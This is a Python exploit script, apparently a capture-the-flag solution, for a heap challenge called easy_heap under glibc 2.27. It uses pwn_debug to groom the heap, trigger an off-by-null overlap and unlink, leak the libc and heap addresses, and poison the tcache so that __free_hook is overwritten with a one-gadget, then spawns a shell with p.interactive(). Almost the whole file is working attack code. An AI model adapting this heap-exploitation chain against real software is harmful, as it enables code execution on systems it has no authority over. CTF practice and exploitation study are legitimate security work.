# File: exp.py
# Author: raycp
# Date: 2019-06-03
# Description: exp for easy_heap, build fake unlink with unsorted_bin chain

from pwn_debug import *


pdbg=pwn_debug("./easy_heap")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local("./libc-2.27.so","/glibc/x64/2.27/lib/ld-2.27.so")
pdbg.debug("2.27")
#pdbg.remote('127.0.0.1', 22)
p=pdbg.run("local")
#p=pdbg.run("remote")
#p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()

def malloc(size,content):
    p.recvuntil("command?\n> ")
    p.sendline("1")
    p.recvuntil("size \n> ")
    p.sendline(str(size))
    p.recvuntil("content \n> ")
    p.send(content)
def free(idx):
    p.recvuntil("command?\n> ")
    p.sendline("2")
    p.recvuntil("index \n> ")
    p.sendline(str(idx))

def puts(idx):
    p.recvuntil("command?\n> ")
    p.sendline("3")
    p.recvuntil("index \n> ")
    p.sendline(str(idx))


def pwn():
    
    #pdbg.bp()
    
    for i in range(0,10):
        malloc(0x28,'a\n')
    
    free(9)
    free(7)
    free(6)
    free(4)
    free(3)
    free(2)
    free(0)

    #pdbg.bp(0xeff)

    # form the unlink in unsorted bin
    free(5)
    free(1)
    free(8)

    for i in range(0,7):
       malloc(0x28,'\x00')
    #pdbg.bp(0xd68)
    malloc(0x28,'\x00') #7
    #pdbg.bp(0xeff)
    malloc(0xf8,'\x00') #8 ## off-by-null

    free(6)
    free(5)
    free(4)
    free(3)
    free(2)
    free(0)

    free(1)  # will merge with chunk 8 for prev_inuse is 0, and the unlink condition is satidfied.
    puts(8)
    unsorted_addr=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))
    #libc_base=unsorted_addr-libc.symbols['main_arena']-0x60
    libc_base=unsorted_addr-0x3ebca0
    free_hook=libc_base+libc.symbols['__free_hook']
    rce=libc_base+0x4f322  
    log.info("leak libc base: %s"%(hex(libc_base)))
    
    for i in range(0,7):
        malloc(0x28,'\x00')
    #pdbg.bp([0xd68,0xeff])
    malloc(0x20,'\x00') #9   the 9 chunk are the same memory with 8

    free(0)
    free(9)
    puts(8)
    heap_addr=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))
    heap_base=heap_addr-0x310
    log.info("leak heap base: %s"%(hex(heap_base)))

    free(8)   ##tcache attack
    #pdbg.bp([0xd68,0xeff])
    pdbg.bp(command=["b *%s"%(hex(rce))])
    malloc(0x20,p64(free_hook)[:7]) #0
    malloc(0x20,"\x00") #8
    malloc(0x20,p64(rce)[:7]) #8

    ## trigger free
    free(0)
    p.interactive() 

if __name__ == '__main__':
   pwn()


